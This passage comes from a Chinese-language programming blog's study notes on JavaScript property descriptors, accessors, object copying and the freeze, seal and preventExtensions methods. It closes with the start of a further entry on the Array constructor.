<p>上面代码中，<code>toString</code>不是<code>obj</code>对象自身的属性，但是<code>in</code>运算符也返回<code>true</code>，这导致了<code>toString</code>属性也会被<code>for...in</code>循环遍历。<br>这显然不太合理，后来就引入了“可遍历性”这个概念。只有可遍历的属性，才会被<code>for...in</code>循环遍历，同时还规定<code>toString</code>这一类实例对象继承的原生属性，都是不可遍历的，这样就保证了<code>for...in</code>循环的可用性。<br>具体来说，如果一个属性的<code>enumerable</code>为<code>false</code>，下面三个操作不会取到该属性:</p>
<ul>
<li><code>for..in</code>循环</li>
<li><code>Object.keys</code>方法</li>
<li><code>JSON.stringify</code>方法</li>
</ul>
<p>因此，<code>enumerable</code>可以用来设置“秘密”属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;x&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="number">123</span>,</span><br><span class="line">  enumerable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.x <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(obj)  <span class="comment">// []</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(obj) <span class="comment">// &quot;&#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>注意，<code>for...in</code>循环包括继承的属性，<code>Object.keys</code>方法不包括继承的属性。如果需要获取对象自身的所有属性，不管是否可遍历，可以使用<code>Object.getOwnPropertyNames</code>方法<br>另外，<code>JSON.stringify</code>方法会排除<code>enumerable</code>为<code>false</code>的属性，有时可以利用这一点。如果对象的 JSON 格式输出要排除某些属性，就可以把这些属性的<code>enumerable</code>设为<code>false</code></p>
<h5 id="2-6-4-configurable"><a href="#2-6-4-configurable" class="headerlink" title="2.6.4 configurable"></a>2.6.4 configurable</h5><p><code>configurable</code>(可配置性）返回一个布尔值，决定了是否可以修改属性描述对象。也就是说，<code>configurable</code>为<code>false</code>时，<code>value</code>、<code>writable</code>、<code>enumerable</code>和<code>configurable</code>都不能被修改了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.defineProperty(&#123;&#125;, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="number">1</span>,</span><br><span class="line">  writable: <span class="literal">false</span>,</span><br><span class="line">  enumerable: <span class="literal">false</span>,</span><br><span class="line">  configurable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;p&#x27;</span>, &#123;<span class="attr">value</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="comment">// TypeError: Cannot redefine property: p</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;p&#x27;</span>, &#123;<span class="attr">writable</span>: <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="comment">// TypeError: Cannot redefine property: p</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;p&#x27;</span>, &#123;<span class="attr">enumerable</span>: <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="comment">// TypeError: Cannot redefine property: p</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;p&#x27;</span>, &#123;<span class="attr">configurable</span>: <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="comment">// TypeError: Cannot redefine property: p</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.p</code>的<code>configurable</code>为<code>false</code>。然后，改动<code>value</code>、<code>writable</code>、<code>enumerable</code>、<code>configurable</code>，结果都报错<br>注意，<code>writable</code>只有在<code>false</code>改为<code>true</code>会报错，<code>true</code>改为<code>false</code>是允许的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.defineProperty(&#123;&#125;, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  writable: <span class="literal">true</span>,</span><br><span class="line">  configurable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;p&#x27;</span>, &#123;<span class="attr">writable</span>: <span class="literal">false</span>&#125;)</span><br><span class="line"><span class="comment">// 修改成功</span></span><br></pre></td></tr></table></figure>
<p>至于<code>value</code>，只要<code>writable</code>和<code>configurable</code>有一个为<code>true</code>，就允许改动</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = <span class="built_in">Object</span>.defineProperty(&#123;&#125;, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="number">1</span>,</span><br><span class="line">  writable: <span class="literal">true</span>,</span><br><span class="line">  configurable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(o1, <span class="string">&#x27;p&#x27;</span>, &#123;<span class="attr">value</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="comment">// 修改成功</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o2 = <span class="built_in">Object</span>.defineProperty(&#123;&#125;, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="number">1</span>,</span><br><span class="line">  writable: <span class="literal">false</span>,</span><br><span class="line">  configurable: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(o2, <span class="string">&#x27;p&#x27;</span>, &#123;<span class="attr">value</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="comment">// 修改成功</span></span><br></pre></td></tr></table></figure>
<p>另外，<code>writable</code>为<code>false</code>时，直接目标属性赋值，不报错，但不会成功</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.defineProperty(&#123;&#125;, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="number">1</span>,</span><br><span class="line">  writable: <span class="literal">false</span>,</span><br><span class="line">  configurable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.p = <span class="number">2</span>;</span><br><span class="line">obj.p <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.p</code>的<code>writable</code>为<code>false</code>，对<code>obj.p</code>直接赋值不会生效。如果是严格模式，还会报错。</p>
<p>可配置性决定了目标属性是否可以被删除（delete）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.defineProperties(&#123;&#125;, &#123;</span><br><span class="line">  p1: &#123; <span class="attr">value</span>: <span class="number">1</span>, <span class="attr">configurable</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">  p2: &#123; <span class="attr">value</span>: <span class="number">2</span>, <span class="attr">configurable</span>: <span class="literal">false</span> &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> obj.p1 <span class="comment">// true</span></span><br><span class="line"><span class="keyword">delete</span> obj.p2 <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">obj.p1 <span class="comment">// undefined</span></span><br><span class="line">obj.p2 <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.p1</code>的<code>configurable</code>是<code>true</code>，所以可以被删除，<code>obj.p2</code>就无法删除</p>
<h4 id="2-7-存取器"><a href="#2-7-存取器" class="headerlink" title="2.7 存取器"></a>2.7 存取器</h4><p>除了直接定义以外，属性还可以用存取器（accessor）定义。其中，存值函数称为<code>setter</code>，使用属性描述对象的<code>set</code>属性；取值函数称为<code>getter</code>，使用属性描述对象的<code>get</code>属性。<br>一旦对目标属性定义了存取器，那么存取的时候，都将执行对应的函数。利用这个功能，可以实现许多高级特性，比如定制属性的读取和赋值行为。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.defineProperty(&#123;&#125;, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  get: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;getter&#x27;</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  set: <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;setter: &#x27;</span> + value);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.p <span class="comment">// &quot;getter&quot;</span></span><br><span class="line">obj.p = <span class="number">123</span> <span class="comment">// &quot;setter: 123&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.p</code>定义了<code>get</code>和<code>set</code>属性。<code>obj.p</code>取值时，就会调用<code>get</code>；赋值时，就会调用<code>set</code><br>JavaScript 还提供了存取器的另一种写法:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="keyword">get</span> <span class="title">p</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;getter&#x27;</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">set</span> <span class="title">p</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;setter: &#x27;</span> + value);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>面两种写法，虽然属性<code>p</code>的读取和赋值行为是一样的，但是有一些细微的区别。第一种写法，属性<code>p</code>的<code>configurable</code>和<code>enumerable</code>都为<code>false</code>，从而导致属性<code>p</code>是不可遍历的；第二种写法，属性<code>p</code>的<code>configurable</code>和<code>enumerable</code>都为<code>true</code>，因此属性<code>p</code>是可遍历的。实际开发中，写法二更常用。<br>注意，取值函数<code>get</code>不能接受参数，存值函数set只能接受一个参数（即属性的值）。<br>存取器往往用于，属性的值依赖对象内部数据的场合。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj =&#123;</span><br><span class="line">  $n : <span class="number">5</span>,</span><br><span class="line">  <span class="keyword">get</span> <span class="title">next</span>() &#123; <span class="keyword">return</span> <span class="built_in">this</span>.$n++ &#125;,</span><br><span class="line">  <span class="keyword">set</span> <span class="title">next</span>(<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (n &gt;= <span class="built_in">this</span>.$n) <span class="built_in">this</span>.$n = n;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;新的值必须大于当前值&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.next <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">obj.next = <span class="number">10</span>;</span><br><span class="line">obj.next <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line">obj.next = <span class="number">5</span>;</span><br><span class="line"><span class="comment">// Uncaught Error: 新的值必须大于当前值</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>next</code>属性的存值函数和取值函数，都依赖于内部属性<code>$n</code></p>
<h4 id="2-8-对象的拷贝"><a href="#2-8-对象的拷贝" class="headerlink" title="2.8 对象的拷贝"></a>2.8 对象的拷贝</h4><p>有时，我们需要将一个对象的所有属性，拷贝到另一个对象，可以用下面的方法实现</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> extend = <span class="function"><span class="keyword">function</span> (<span class="params">to, <span class="keyword">from</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> property <span class="keyword">in</span> <span class="keyword">from</span>) &#123;</span><br><span class="line">    to[property] = <span class="keyword">from</span>[property];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> to;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extend(&#123;&#125;, &#123;</span><br><span class="line">  a: <span class="number">1</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// &#123;a: 1&#125;</span></span><br></pre></td></tr></table></figure>
<p>上面这个方法的问题在于，如果遇到存取器定义的属性，会只拷贝值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">extend(&#123;&#125;, &#123;</span><br><span class="line">  <span class="keyword">get</span> <span class="title">a</span>() &#123; <span class="keyword">return</span> <span class="number">1</span> &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// &#123;a: 1&#125;</span></span><br></pre></td></tr></table></figure>
<p>为了解决这个问题，我们可以通过<code>Object.defineProperty</code>方法来拷贝属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> extend = <span class="function"><span class="keyword">function</span> (<span class="params">to, <span class="keyword">from</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> property <span class="keyword">in</span> <span class="keyword">from</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">from</span>.hasOwnProperty(property)) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(</span><br><span class="line">      to,</span><br><span class="line">      property,</span><br><span class="line">      <span class="built_in">Object</span>.getOwnPropertyDescriptor(<span class="keyword">from</span>, property)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> to;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extend(&#123;&#125;, &#123; <span class="keyword">get</span> <span class="title">a</span>()&#123; <span class="keyword">return</span> <span class="number">1</span> &#125; &#125;)</span><br><span class="line"><span class="comment">// &#123; get a()&#123; return 1 &#125; &#125;)</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>hasOwnProperty</code>那一行用来过滤掉继承的属性，否则可能会报错，因为<code>Object.getOwnPropertyDescriptor</code>读不到继承属性的属性描述对象</p>
<h4 id="2-9-控制对象状态"><a href="#2-9-控制对象状态" class="headerlink" title="2.9 控制对象状态"></a>2.9 控制对象状态</h4><p>有时需要冻结对象的读写状态，防止对象被改变。JavaScript 提供了三种冻结方法，最弱的一种是<code>Object.preventExtensions</code>，其次是<code>Object.seal</code>，最强的是<code>Object.freeze</code></p>
<h5 id="2-9-1-Object-preventExtensions"><a href="#2-9-1-Object-preventExtensions" class="headerlink" title="2.9.1 Object.preventExtensions()"></a>2.9.1 Object.preventExtensions()</h5><p><code>Object.preventExtensions</code>方法可以使得一个对象无法再添加新的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="built_in">Object</span>.preventExtensions(obj);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// TypeError: Cannot define property:p, object is not extensible.</span></span><br><span class="line"></span><br><span class="line">obj.p = <span class="number">1</span>;</span><br><span class="line">obj.p <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj</code>对象经过<code>Object.preventExtensions</code>以后，就无法添加新属性了</p>
<h5 id="2-9-2-Object-isExtensible"><a href="#2-9-2-Object-isExtensible" class="headerlink" title="2.9.2 Object.isExtensible()"></a>2.9.2 Object.isExtensible()</h5><p><code>Object.isExtensible</code>方法用于检查一个对象是否使用了<code>Object.preventExtensions</code>方法。也就是说，检查是否可以为一个对象添加属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.isExtensible(obj) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.preventExtensions(obj);</span><br><span class="line"><span class="built_in">Object</span>.isExtensible(obj) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对<code>obj</code>对象使用<code>Object.preventExtensions</code>方法以后，再使用<code>Object.isExtensible</code>方法，返回<code>false</code>，表示已经不能添加新属性了</p>
<h5 id="2-9-3-Object-seal"><a href="#2-9-3-Object-seal" class="headerlink" title="2.9.3 Object.seal()"></a>2.9.3 Object.seal()</h5><p><code>Object.seal</code>方法使得一个对象既无法添加新属性，也无法删除旧属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">p</span>: <span class="string">&#x27;hello&#x27;</span> &#125;;</span><br><span class="line"><span class="built_in">Object</span>.seal(obj);</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> obj.p;</span><br><span class="line">obj.p <span class="comment">// &quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line">obj.x = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">obj.x <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj</code>对象执行<code>Object.seal</code>方法以后，就无法添加新属性和删除旧属性了。<br><code>Object.seal</code>实质是把属性描述对象的<code>configurable</code>属性设为<code>false</code>，因此属性描述对象不再能改变了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p: <span class="string">&#x27;a&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// seal方法之前</span></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, <span class="string">&#x27;p&#x27;</span>)</span><br><span class="line"><span class="comment">// Object &#123;</span></span><br><span class="line"><span class="comment">//   value: &quot;a&quot;,</span></span><br><span class="line"><span class="comment">//   writable: true,</span></span><br><span class="line"><span class="comment">//   enumerable: true,</span></span><br><span class="line"><span class="comment">//   configurable: true</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.seal(obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">// seal方法之后</span></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, <span class="string">&#x27;p&#x27;</span>)</span><br><span class="line"><span class="comment">// Object &#123;</span></span><br><span class="line"><span class="comment">//   value: &quot;a&quot;,</span></span><br><span class="line"><span class="comment">//   writable: true,</span></span><br><span class="line"><span class="comment">//   enumerable: true,</span></span><br><span class="line"><span class="comment">//   configurable: false</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  enumerable: <span class="literal">false</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// TypeError: Cannot redefine property: p</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，使用<code>Object.seal</code>方法之后，属性描述对象的<code>configurable</code>属性就变成了<code>false</code>，然后改变<code>enumerable</code>属性就会报错<br><code>Object.seal</code>只是禁止新增或删除属性，并不影响修改某个属性的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">p</span>: <span class="string">&#x27;a&#x27;</span> &#125;;</span><br><span class="line"><span class="built_in">Object</span>.seal(obj);</span><br><span class="line">obj.p = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">obj.p <span class="comment">// &#x27;b&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Object.seal</code>方法对<code>p</code>属性的<code>value</code>无效，是因为此时<code>p</code>属性的可写性由<code>writable</code>决定</p>
<h5 id="2-9-4-Object-isSealed"><a href="#2-9-4-Object-isSealed" class="headerlink" title="2.9.4 Object.isSealed()"></a>2.9.4 Object.isSealed()</h5><p><code>Object.isSealed</code>方法用于检查一个对象是否使用了<code>Object.seal</code>方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">p</span>: <span class="string">&#x27;a&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.seal(obj);</span><br><span class="line"><span class="built_in">Object</span>.isSealed(obj) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>这时，<code>Object.isExtensible</code>方法也返回<code>false</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">p</span>: <span class="string">&#x27;a&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.seal(obj);</span><br><span class="line"><span class="built_in">Object</span>.isExtensible(obj) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h5 id="2-9-5-Object-freeze"><a href="#2-9-5-Object-freeze" class="headerlink" title="2.9.5 Object.freeze()"></a>2.9.5 Object.freeze()</h5><p><code>Object.freeze</code>方法可以使得一个对象无法添加新属性、无法删除旧属性、也无法改变属性的值，使得这个对象实际上变成了常量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(obj);</span><br><span class="line"></span><br><span class="line">obj.p = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">obj.p <span class="comment">// &quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line">obj.t = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">obj.t <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> obj.p <span class="comment">// false</span></span><br><span class="line">obj.p <span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对<code>obj</code>对象进行<code>Object.freeze()</code>以后，修改属性、新增属性、删除属性都无效了。这些操作并不报错，只是默默地失败。如果在严格模式下，则会报错</p>
<h5 id="2-9-6-Object-isFrozen"><a href="#2-9-6-Object-isFrozen" class="headerlink" title="2.9.6 Object.isFrozen()"></a>2.9.6 Object.isFrozen()</h5><p><code>Object.isFrozen</code>方法用于检查一个对象是否使用了<code>Object.freeze</code>方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(obj);</span><br><span class="line"><span class="built_in">Object</span>.isFrozen(obj) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>使用<code>Object.freeze</code>方法以后，<code>Object.isSealed</code>将会返回<code>true</code>，<code>Object.isExtensible</code>返回<code>false</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(obj);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.isSealed(obj) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.isExtensible(obj) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p><code>Object.isFrozen</code>的一个用途是，确认某个对象没有被冻结后，再对它的属性赋值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(obj);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">Object</span>.isFrozen(obj)) &#123;</span><br><span class="line">  obj.p = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，确认<code>obj</code>没有被冻结后，再对它的属性赋值，就不会报错了</p>
<h5 id="2-9-7-局限性"><a href="#2-9-7-局限性" class="headerlink" title="2.9.7 局限性"></a>2.9.7 局限性</h5><p>上面的三个方法锁定对象的可写性有一个漏洞：可以通过改变原型对象，来为对象增加属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="built_in">Object</span>.preventExtensions(obj);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> proto = <span class="built_in">Object</span>.getPrototypeOf(obj);</span><br><span class="line">proto.t = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">obj.t</span><br><span class="line"><span class="comment">// hello</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象<code>obj</code>本身不能新增属性，但是可以在它的原型对象上新增属性，就依然能够在<code>obj</code>上读到。<br>一种解决方案是，把<code>obj</code>的原型也冻结住</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="built_in">Object</span>.preventExtensions(obj);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> proto = <span class="built_in">Object</span>.getPrototypeOf(obj);</span><br><span class="line"><span class="built_in">Object</span>.preventExtensions(proto);</span><br><span class="line"></span><br><span class="line">proto.t = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">obj.t <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>另外一个局限是，如果属性值是对象，上面这些方法只能冻结属性指向的对象，而不能冻结对象本身的内容</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  foo: <span class="number">1</span>,</span><br><span class="line">  bar: [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Object</span>.freeze(obj);</span><br><span class="line"></span><br><span class="line">obj.bar.push(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">obj.bar <span class="comment">// [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.bar</code>属性指向一个数组，<code>obj</code>对象被冻结以后，这个指向无法改变，即无法指向其他值，但是所指向的数组是可以改变的</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS标准库-属性描述对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0017</title>
    <url>/2021/05/13/%E6%89%93%E5%8D%A10017/</url>
    <content><![CDATA[<p><font color=#f15a22>希望你有对感情的向往，也能始终把握感情的走向，让心有所归，感情踏实稳固，愿我们遇见的感情，都是最好的模样。</font></p>
<h2 id="JS标准库"><a href="#JS标准库" class="headerlink" title="JS标准库"></a>JS标准库</h2><h3 id="3-Array对象"><a href="#3-Array对象" class="headerlink" title="3. Array对象"></a>3. Array对象</h3><h4 id="3-1-构造函数"><a href="#3-1-构造函数" class="headerlink" title="3.1 构造函数"></a>3.1 构造函数</h4><p><code>Array</code>是 JavaScript 的原生对象，同时也是一个构造函数，可以用它生成新的数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2</span>);</span><br><span class="line">arr.length <span class="comment">// 2</span></span><br><span class="line">arr <span class="comment">// [ empty x 2 ]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Array()</code>构造函数的参数<code>2</code>，表示生成一个两个成员的数组，每个位置都是空值。<br>如果没有使用<code>new</code>关键字，运行结果也是一样的。</p>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = <span class="built_in">Array</span>(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>考虑到语义性，以及与其他构造函数用法保持一致，建议总是加上<code>new</code><br><code>Array()</code>构造函数有一个很大的缺陷，不同的参数个数会导致不一致的行为</p>
